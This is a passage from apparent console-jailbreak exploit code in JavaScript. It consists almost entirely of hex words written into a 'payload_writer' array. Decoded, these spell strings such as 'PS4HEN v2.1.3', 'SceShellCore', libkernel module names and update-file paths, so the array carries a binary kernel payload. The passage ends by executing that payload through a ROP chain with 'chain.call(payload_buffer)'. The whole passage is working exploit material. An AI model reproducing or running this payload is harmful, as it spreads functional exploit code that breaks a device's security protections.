  payload_writer[1817] = 0x1A65F35B;
  payload_writer[1818] = 0xB99BCFC8;
  payload_writer[1819] = 0x5D90C92A;
  payload_writer[1820] = 0xF6CF08D4;
  payload_writer[1821] = 0xFC5A5A03;
  payload_writer[1822] = 0x11DBB69E;
  payload_writer[1823] = 0x623DE2ED;
  payload_writer[1824] = 0x5D88FCC1;
  payload_writer[1825] = 0x2D31AC97;
  payload_writer[1826] = 0x70AD15C3;
  payload_writer[1827] = 0x5AA0BE05;
  payload_writer[1828] = 0x449C34E6;
  payload_writer[1829] = 0xFEE52B78;
  payload_writer[1830] = 0x68D45638;
  payload_writer[1831] = 0xE6A41383;
  payload_writer[1832] = 0xAB9CD2FA;
  payload_writer[1833] = 0x105F89AC;
  payload_writer[1834] = 0x046F758F;
  payload_writer[1835] = 0xBCB9AEBC;
  payload_writer[1836] = 0xFA421DB7;
  payload_writer[1837] = 0xB41F944E;
  payload_writer[1838] = 0x6B9C270A;
  payload_writer[1839] = 0xEBD2C7AB;
  payload_writer[1840] = 0x29524227;
  payload_writer[1841] = 0x4025C841;
  payload_writer[1842] = 0x6D48E054;
  payload_writer[1843] = 0x84778023;
  payload_writer[1844] = 0x249B6F4D;
  payload_writer[1845] = 0x6B2AFE51;
  payload_writer[1846] = 0x9EA18028;
  payload_writer[1847] = 0xCA186DBD;
  payload_writer[1848] = 0x799E7D8D;
  payload_writer[1849] = 0xEBB8E05A;
  payload_writer[1850] = 0xD9F33DD1;
  payload_writer[1851] = 0xA72A9002;
  payload_writer[1852] = 0xA29A7EB5;
  payload_writer[1853] = 0xA8212FD7;
  payload_writer[1854] = 0xA18C7D50;
  payload_writer[1855] = 0x97BF2F91;
  payload_writer[1856] = 0xC1C292BE;
  payload_writer[1857] = 0x1F0C8C0D;
  payload_writer[1858] = 0x153531DE;
  payload_writer[1859] = 0x97CC9039;
  payload_writer[1860] = 0x097F2E47;
  payload_writer[1861] = 0xCE9CC3E9;
  payload_writer[1862] = 0x58C8B291;
  payload_writer[1863] = 0x1D70E876;
  payload_writer[1864] = 0xE64A5F72;
  payload_writer[1865] = 0x942236AA;
  payload_writer[1866] = 0xB39052C6;
  payload_writer[1867] = 0xEFF09B9F;
  payload_writer[1868] = 0xC3538E57;
  payload_writer[1869] = 0xD7C930E3;
  payload_writer[1870] = 0x790C3AB0;
  payload_writer[1871] = 0xD4A8971B;
  payload_writer[1872] = 0xB0D22281;
  payload_writer[1873] = 0x007D6282;
  payload_writer[1874] = 0xC79E4758;
  payload_writer[1875] = 0x65B4E82D;
  payload_writer[1876] = 0x6A7805BE;
  payload_writer[1877] = 0x5AC93189;
  payload_writer[1878] = 0xC150DE44;
  payload_writer[1879] = 0x3E9DFDC7;
  payload_writer[1880] = 0x40174221;
  payload_writer[1881] = 0x41C9F979;
  payload_writer[1882] = 0x0FD7FCC1;
  payload_writer[1883] = 0xE2A37634;
  payload_writer[1884] = 0x205A1BC0;
  payload_writer[1885] = 0x522FAF0F;
  payload_writer[1886] = 0x723483CD;
  payload_writer[1887] = 0x3312B3AF;
  payload_writer[1888] = 0xB0202C21;
  payload_writer[1889] = 0xB12DA0C6;
  payload_writer[1890] = 0xB0A7E359;
  payload_writer[1891] = 0x5B4C1C4E;
  payload_writer[1892] = 0x509A105F;
  payload_writer[1893] = 0x7986CC18;
  payload_writer[1894] = 0x0210FF25;
  payload_writer[1895] = 0xA903908F;
  payload_writer[1896] = 0x1CF2BA37;
  payload_writer[1897] = 0x4509CC13;
  payload_writer[1898] = 0x7455B815;
  payload_writer[1899] = 0x0424280A;
  payload_writer[1900] = 0xB3AB19D1;
  payload_writer[1901] = 0xF8B644CA;
  payload_writer[1902] = 0x722AB13D;
  payload_writer[1903] = 0x86E43588;
  payload_writer[1904] = 0x0847556B;
  payload_writer[1905] = 0x69AB1625;
  payload_writer[1906] = 0xFEF6BF1D;
  payload_writer[1907] = 0x7461642F;
  payload_writer[1908] = 0x65732F61;
  payload_writer[1909] = 0x002F666C;
  payload_writer[1915] = 0x00000002;
  payload_writer[1916] = 0x31000000;
  payload_writer[1919] = 0x0000FF00;
  payload_writer[1925] = 0x40000000;
  payload_writer[1926] = 0x30003000;
  payload_writer[1928] = 0x40000000;
  payload_writer[1930] = 0x00800000;
  payload_writer[1931] = 0xFFFF4000;
  payload_writer[1932] = 0xF0000000;
  payload_writer[1955] = 0x00000001;
  payload_writer[1956] = 0x31000000;
  payload_writer[1958] = 0x20000380;
  payload_writer[1959] = 0x0000FF00;
  payload_writer[1965] = 0x40000000;
  payload_writer[1966] = 0x40004000;
  payload_writer[1968] = 0x40000000;
  payload_writer[1969] = 0x00000002;
  payload_writer[1970] = 0x00800000;
  payload_writer[1971] = 0xFFFF4000;
  payload_writer[1972] = 0xF0000000;
  payload_writer[1989] = 0x53656353;
  payload_writer[1990] = 0x6C6C6568;
  payload_writer[1991] = 0x65726F43;
  payload_writer[1992] = 0x90C03100;
  payload_writer[1993] = 0xEB009090;
  payload_writer[1994] = 0x65635300;
  payload_writer[1995] = 0x6C656853;
  payload_writer[1996] = 0x0049556C;
  payload_writer[1997] = 0x63657865;
  payload_writer[1998] = 0x62617475;
  payload_writer[1999] = 0x4800656C;
  payload_writer[2000] = 0x00C3C031;
  payload_writer[2001] = 0x2E707061;
  payload_writer[2002] = 0x2E657865;
  payload_writer[2003] = 0x78727073;
  payload_writer[2004] = 0x62696C00;
  payload_writer[2005] = 0x6E72656B;
  payload_writer[2006] = 0x735F6C65;
  payload_writer[2007] = 0x732E7379;
  payload_writer[2008] = 0x00787270;
  payload_writer[2009] = 0x52656353;
  payload_writer[2010] = 0x746F6D65;
  payload_writer[2011] = 0x616C5065;
  payload_writer[2012] = 0x00010079;
  payload_writer[2013] = 0x68001EEB;
  payload_writer[2014] = 0x735F6E65;
  payload_writer[2015] = 0x65707375;
  payload_writer[2016] = 0x705F646E;
  payload_writer[2017] = 0x68637461;
  payload_writer[2018] = 0x73007365;
  payload_writer[2019] = 0x65747379;
  payload_writer[2020] = 0x75735F6D;
  payload_writer[2021] = 0x6E657073;
  payload_writer[2022] = 0x68705F64;
  payload_writer[2023] = 0x33657361;
  payload_writer[2024] = 0x6E656800;
  payload_writer[2025] = 0x7365725F;
  payload_writer[2026] = 0x5F656D75;
  payload_writer[2027] = 0x63746170;
  payload_writer[2028] = 0x00736568;
  payload_writer[2029] = 0x74737973;
  payload_writer[2030] = 0x725F6D65;
  payload_writer[2031] = 0x6D757365;
  payload_writer[2032] = 0x68705F65;
  payload_writer[2033] = 0x34657361;
  payload_writer[2035] = 0x000098E9;
  payload_writer[2036] = 0x90909000;
  payload_writer[2037] = 0x65726600;
  payload_writer[2038] = 0x00000065;
  payload_writer[2043] = 0x00174260;
  payload_writer[2044] = 0x007F5D00;
  payload_writer[2045] = 0x00840132;
  payload_writer[2046] = 0x009CE100;
  payload_writer[2047] = 0x0017428A;
  payload_writer[2048] = 0x0023A6FC;
  payload_writer[2049] = 0x007F5D2A;
  payload_writer[2050] = 0x009CE12A;
  payload_writer[2051] = 0x0002BAE9;
  payload_writer[2053] = 0x00001C06;
  payload_writer[2054] = 0x2F007325;
  payload_writer[2055] = 0x61647075;
  payload_writer[2056] = 0x502F6574;
  payload_writer[2057] = 0x50553453;
  payload_writer[2058] = 0x45544144;
  payload_writer[2059] = 0x5055502E;
  payload_writer[2060] = 0x70752F00;
  payload_writer[2061] = 0x65746164;
  payload_writer[2062] = 0x3453502F;
  payload_writer[2063] = 0x41445055;
  payload_writer[2064] = 0x502E4554;
  payload_writer[2065] = 0x6E2E5055;
  payload_writer[2066] = 0x742E7465;
  payload_writer[2067] = 0x00706D65;
  payload_writer[2068] = 0x636C6557;
  payload_writer[2069] = 0x20656D6F;
  payload_writer[2070] = 0x50206F74;
  payload_writer[2071] = 0x45483453;
  payload_writer[2072] = 0x3276204E;
  payload_writer[2073] = 0x332E312E;
  payload_writer[2074] = 0x62696C00;
  payload_writer[2075] = 0x6E72656B;
  payload_writer[2076] = 0x732E6C65;
  payload_writer[2077] = 0x00787270;
  payload_writer[2078] = 0x6B62696C;
  payload_writer[2079] = 0x656E7265;
  payload_writer[2080] = 0x65775F6C;
  payload_writer[2081] = 0x70732E62;
  payload_writer[2082] = 0x6C007872;
  payload_writer[2083] = 0x656B6269;
  payload_writer[2084] = 0x6C656E72;
  payload_writer[2085] = 0x7379735F;
  payload_writer[2086] = 0x7270732E;
  payload_writer[2087] = 0x5F5F0078;
  payload_writer[2088] = 0x6F727265;
  payload_writer[2089] = 0x63730072;
  payload_writer[2090] = 0x72654B65;
  payload_writer[2091] = 0x4C6C656E;
  payload_writer[2092] = 0x5364616F;
  payload_writer[2093] = 0x74726174;
  payload_writer[2094] = 0x75646F4D;
  payload_writer[2095] = 0x6C00656C;
  payload_writer[2096] = 0x63536269;
  payload_writer[2097] = 0x62694C65;
  payload_writer[2098] = 0x746E4963;
  payload_writer[2099] = 0x616E7265;
  payload_writer[2100] = 0x70732E6C;
  payload_writer[2101] = 0x6D007872;
  payload_writer[2102] = 0x65736D65;
  payload_writer[2103] = 0x656D0074;
  payload_writer[2104] = 0x7970636D;
  payload_writer[2105] = 0x72707300;
  payload_writer[2106] = 0x66746E69;
  payload_writer[2107] = 0x79732F00;
  payload_writer[2108] = 0x6D657473;
  payload_writer[2109] = 0x6D6F632F;
  payload_writer[2110] = 0x2F6E6F6D;
  payload_writer[2111] = 0x2F62696C;
  payload_writer[2112] = 0x5362696C;
  payload_writer[2113] = 0x79536563;
  payload_writer[2114] = 0x69745573;
  payload_writer[2115] = 0x70732E6C;
  payload_writer[2116] = 0x73007872;
  payload_writer[2117] = 0x79536563;
  payload_writer[2118] = 0x69745573;
  payload_writer[2119] = 0x6E65536C;
  payload_writer[2120] = 0x73795364;
  payload_writer[2121] = 0x4E6D6574;
  payload_writer[2122] = 0x6669746F;
  payload_writer[2123] = 0x74616369;
  payload_writer[2124] = 0x576E6F69;
  payload_writer[2125] = 0x54687469;
  payload_writer[2126] = 0x00747865;
  payload_writer[2127] = 0x62696C2F;
  payload_writer[2128] = 0x6C2F3436;
  payload_writer[2129] = 0x696C2D64;
  payload_writer[2130] = 0x2D78756E;
  payload_writer[2131] = 0x2D363878;
  payload_writer[2132] = 0x732E3436;
  payload_writer[2133] = 0x00322E6F;
  payload_writer[2142] = 0x00000001;
  payload_writer[2143] = 0x00000001;
  payload_writer[2144] = 0x00000001;
  payload_writer[2150] = 0x6FFFFEF5;
  payload_writer[2152] = 0x26202178;
  payload_writer[2153] = 0x00000009;
  payload_writer[2154] = 0x00000005;
  payload_writer[2156] = 0x26202170;
  payload_writer[2157] = 0x00000009;
  payload_writer[2158] = 0x00000006;
  payload_writer[2160] = 0x26202158;
  payload_writer[2161] = 0x00000009;
  payload_writer[2162] = 0x0000000A;
  payload_writer[2164] = 0x00000001;
  payload_writer[2166] = 0x0000000B;
  payload_writer[2168] = 0x00000018;
  payload_writer[2170] = 0x00000015;
  payload_writer[2174] = 0x0000001E;
  payload_writer[2176] = 0x00000008;
  payload_writer[2178] = 0x6FFFFFFB;
  payload_writer[2180] = 0x08000001;



	chain.call(payload_buffer);
	/*
    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(payload_buffer);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
  */
}